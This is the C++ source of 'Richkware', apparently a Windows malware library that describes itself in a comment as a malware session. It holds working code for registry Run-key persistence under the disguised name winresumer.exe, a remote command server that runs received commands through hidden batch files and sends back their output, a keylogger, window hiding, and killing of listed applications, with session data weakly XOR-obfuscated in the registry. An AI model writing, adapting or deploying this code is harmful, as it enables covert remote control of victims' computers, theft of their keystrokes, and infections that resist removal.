/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#include "Richkware.h"

void Richkware::SaveInfo(const char* key, const char* value){
	LoadSession(EncryptionKey);
	session.insert(std::pair<std::string, std::string>(key,value));
	SaveSession(EncryptionKey);
}

std::string Richkware::FindInfo(const char * key){
	LoadSession(EncryptionKey);
	std::map<std::string, std::string>::iterator it = session.find(key);
	if (it != session.end())
		return it->second;
	else
		return "";
}

void Richkware::RemoveInfo(const char * key){
	LoadSession(EncryptionKey);
	session.erase(key);
	SaveSession(EncryptionKey);
}

BOOL Richkware::IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError) {
		throw dwError;
	}

	return fIsRunAsAdmin;
}

void Richkware::RequestAdminPrivileges() {
	BOOL bAlreadyRunningAsAdministrator = FALSE;
	try {
		bAlreadyRunningAsAdministrator = IsAdmin();
	}
	catch (...) {

	}
	if (!bAlreadyRunningAsAdministrator) {
		char szPath[MAX_PATH];
		if (GetModuleFileName(NULL, szPath, MAX_PATH)) {

			SHELLEXECUTEINFO sei = { sizeof(sei) };

			sei.lpVerb = "runas";
			sei.lpFile = szPath;
			sei.hwnd = NULL;
			sei.nShow = SW_NORMAL;

			/*if (!ShellExecuteEx(&sei)) {
			 DWORD dwError = GetLastError();
			 //if (dwError == ERROR_CANCELLED)
			 //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
			 }*/
		}

	}
	else {
		///Code
	}
}

void Richkware::Persistance() {
	// copy value in system
	HMODULE module_handler = GetModuleHandle(NULL);
	char file_path[MAX_PATH];
	char system_path[MAX_PATH];
	char system_path_reg[MAX_PATH] = "\"";
	char tmp_path[MAX_PATH];
	char tmp_path_reg[MAX_PATH] = "\"";

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	strcat(system_path_reg, system_path);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(tmp_path_reg, tmp_path);

	strcat(system_path_reg, "\\winresumer.exe\" /noshow");
	strcat(system_path, "\\winresumer.exe");
	CopyFile(file_path, system_path, true);

	strcat(tmp_path_reg, "winresumer.exe\" /noshow");
	strcat(tmp_path, "winresumer.exe");
	CopyFile(file_path, tmp_path, true);

	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"Windows1", system_path_reg);
	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"Windows2", tmp_path_reg);

}

void Richkware::StealthWindow(const char* window) {
	HWND app_heandler = FindWindow(NULL, window);
	Sleep(1000);
	if (app_heandler != NULL)
		ShowWindow(app_heandler, false);
}

// OpenApp("notepad.exe");  "http:\\www.google.com"
void Richkware::OpenApp(const char* app) {
	ShellExecute(NULL, "open", app, NULL, NULL, SW_MAXIMIZE);
}

void Richkware::BlockApps() {
	//HANDLE hBlockAppsTh;

	hBlockAppsTh = CreateThread(0, 0, &BlockAppsThread, &dangerousApps, 0, 0);

	//WaitForSingleObject(hBlockAppsTh,INFINITE);

	//CloseHandle(hBlockAppsTh);

}

void Richkware::UnBlockApps() {
	SuspendThread(hBlockAppsTh);
}

DWORD WINAPI
BlockAppsThread(void* arg) {
	std::list<const char*>* dangApps = (std::list<const char*> *) arg;
	HWND app_heandler;

	while (true) {
		for (std::list<const char*>::iterator it = (*(dangApps)).begin();
			it != (*(dangApps)).end(); ++it) {

			app_heandler = FindWindow(NULL, *it);
			if (app_heandler != NULL)
				PostMessage(app_heandler, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}

		Sleep(100);
	}

}

int Richkware::StartServer(const char* port, const char* EncryptionKey) {
	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// multi-thread
	DWORD dwThreadIdArray[MAX_THREAD];
	HANDLE hThreadArray[MAX_THREAD];

	for (int i = 0; i < MAX_THREAD; i++) {
		// Accept a client socket
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}

		ClientSocketArgs csa;
		csa.ClientSocket = ClientSocket;
		csa.EncryptionKey = EncryptionKey;

		hThreadArray[i] = CreateThread(0, 0, &ClientSocketThread,
			(void*)&csa, 0, &dwThreadIdArray[i]);

	}
	// wait until all threads have termined
	WaitForMultipleObjects(MAX_THREAD, hThreadArray, TRUE, INFINITE);

	for (int i = 0; i < MAX_THREAD; i++) {
		CloseHandle(hThreadArray);
	}
	// cleanup
	closesocket(ClientSocket);
	WSACleanup();

	return 0;

}

DWORD WINAPI ClientSocketThread(void* arg) {
	const int bufferlength = 512;
	SOCKET ClientSocket = (SOCKET)((*((ClientSocketArgs*)arg)).ClientSocket);
	const char* EncryptionKey = (const char*)((*((ClientSocketArgs*)arg)).EncryptionKey);
	int iResult;

	std::string command;
	int iSendResult;
	char recvbuf[bufferlength];
	int recvbuflen = bufferlength;
	std::size_t posSubStr;
	// write the output of command in a file
	srand((unsigned int)time(0));
	std::stringstream ss;
	ss << rand(); // An integer value between 0 and RAND_MAX

	std::string fileName = "Windows" + ss.str(); 
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileBat = tmp_path;
	fileBat.append(fileName + ".bat");
	std::string fileLog = tmp_path;
	fileLog.append(fileName + ".log");
	// Receive until the peer shuts down the connection

	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		command.append(recvbuf);

		// string decryption
		if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);

		posSubStr = command.find("---");
		if (posSubStr != std::string::npos) {

			// erase escape characters
			command.erase(posSubStr);

			std::string commandTmp = command;
			commandTmp.append(" > " + fileLog);
			std::ofstream file(fileBat.c_str());

			if (file.is_open()) {
				for (std::string::iterator it = commandTmp.begin();
					it != commandTmp.end(); ++it) {
					file << *it;
				}
				file.close();
			}

			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
				// Response
				command.append("  -->  ");
				std::ifstream fileResp(fileLog.c_str());
				std::string s;
				if (fileResp.is_open()) {
					while (!fileResp.eof()) {
						getline(fileResp, s);
						command.push_back('\n');
						command.append(s);
					}
				}

				// string encryption
				if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);

				iSendResult = send(ClientSocket, command.c_str(),
					(int)strlen(command.c_str()), 0);
				fileResp.close();

			}
			else {
				iSendResult = send(ClientSocket, "error", 5, 0);
			}
			if (iSendResult == SOCKET_ERROR) {
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
		}
		command = "";
		command.clear();

	} while (iResult > 0);

	// remove tmp files
	remove(fileBat.c_str());
	remove(fileLog.c_str());

	// shutdown the connection
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}
	return 0;
}

const char* Richkware::RawRequest(const char* serverAddress, const char* port,
	const char* request) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	const char* sendbuf = request;
	const int bufferlength = 512;
	char recvbuf[bufferlength];
	int iResult;
	std::string response;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		return "Error";
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(serverAddress, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return "Error";
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			WSACleanup();
			return "Error";
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		WSACleanup();
		return "Error";
	}

	// Send an initial buffer
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// Receive until the peer closes the connection
	do {

		iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
		if (iResult > 0) {
			// answer
			response.append(recvbuf);

		}
		else if (iResult == 0) {
			// connection closed
		}
		else {
			// error
		}

	} while (iResult > 0);

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return response.c_str();
}

void Richkware::Hibernation() {
	Sleep(1000);
	SendMessage(HWND_BROADCAST,
		WM_SYSCOMMAND,
		SC_MONITORPOWER, (LPARAM)2);
}


void Richkware::RandMouse() {
	// screen resolution
	RECT desktop;
	const HWND desktop_handler = GetDesktopWindow();
	GetWindowRect(desktop_handler, &desktop);
	long horizontal = desktop.right;
	long vertical = desktop.bottom;

	// move cursor
	SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
}

// XOR
std::string EncryptDecrypt(std::string input, const char* key) {
	int ikey = 5;/////////////////////////////////////////////
	std::string output;

	for (std::string::iterator it = input.begin(); it != input.end(); ++it) {
		output += (*it) ^ ikey;
	}

	return output;
}

void Richkware::SaveSession(const char* EncryptionKey) {
	std::string sessionString;

	for (std::map<std::string, std::string>::iterator it = session.begin();
		it != session.end(); ++it) {
		sessionString.append(it->first + "," + it->second + "|");
	}

	sessionString = EncryptDecrypt(sessionString, EncryptionKey);

	SaveValueReg("Software\\Microsoft\\Windows", "Windows",
		sessionString.c_str());

}

void Richkware::LoadSession(const char* EncryptionKey) {
	std::string sessionString;
	sessionString = LoadValueReg("Software\\Microsoft\\Windows", "Windows");

	sessionString = EncryptDecrypt(sessionString, EncryptionKey);

	session.clear();

	std::string key, tmp;

	for (std::string::iterator it = sessionString.begin();
		it != sessionString.end(); ++it) {

		if (*it == ',') { // end of key
			key = tmp;
			tmp = "";
		}
		else if (*it == '|') { // end of value
			// write key,value into map
			session.insert(std::pair<std::string, std::string>(key,tmp));;
			tmp = "";
		}
		else {
			tmp += *it;
		}

	}

}

void Richkware::SaveValueReg(const char* path, const char* key,
	const char* value) {
	// set value in register
	HKEY hKey;
	HKEY hKey2;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
		KEY_SET_VALUE, &hKey);

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);

	if (hKey != NULL) {
		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}
	if (hKey2 != NULL) {
		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}

	RegCloseKey(hKey);
	RegCloseKey(hKey2);
}

std::string Richkware::LoadValueReg(const char* path, const char* key) {
	std::string value = "";
	HKEY hKey;

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey);
	if (hKey != NULL) {
		char szBuffer[512];
		DWORD dwBufferSize = sizeof(szBuffer);
		RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
		value.append(szBuffer);
	}

	RegCloseKey(hKey);
	return value;
}

void Richkware::Keylogger(const char* fileName) {
	HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);

	if (hBlockAppsTh != NULL) {
		WaitForSingleObject(hBlockAppsTh, INFINITE);
		CloseHandle(hBlockAppsTh);
	}
}

DWORD WINAPI
KeyloggerThread(void* arg) {
	const char* nomeFile = (const char*)arg;
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileLog = tmp_path;
	fileLog.append(nomeFile);
	bool condSession = true;

	while (true) {
		std::ofstream file(fileLog.c_str(), std::ios::app);
		if (file.is_open()) {
			while (condSession) {
				for (int i = 0; i < 256; i++) {
					if (GetAsyncKeyState(i)) {
						file << (char)i;
						if (i == VK_RETURN || i == VK_LBUTTON) {
							condSession = false;
							break;
						}
					}
				}
				Sleep(100);
			}
		}
		file.close();
		condSession = true;
	}
}

// verify the existence of malware session and the values created by the persistence function.
bool Richkware::CheckExistance() {
	bool b = false;
	HMODULE module_handler = GetModuleHandle(NULL);
	char system_path[MAX_PATH];
	char file_path[MAX_PATH];
	char tmp_path[MAX_PATH];

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(system_path, "\\winresumer.exe");
	strcat(tmp_path, "winresumer.exe");
	std::ifstream fileSys(system_path);
	std::ifstream fileTmp(tmp_path);

	// (sess) && ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
	if (!(LoadValueReg("Software\\Microsoft\\Windows", "Windows").empty()) &&
		((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows1").empty()) &&
		(fileSys.is_open())) ||
			(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows2").empty()) &&
			(fileTmp.is_open())))) b = true;

	fileSys.close();
	fileTmp.close();

	return b;
}

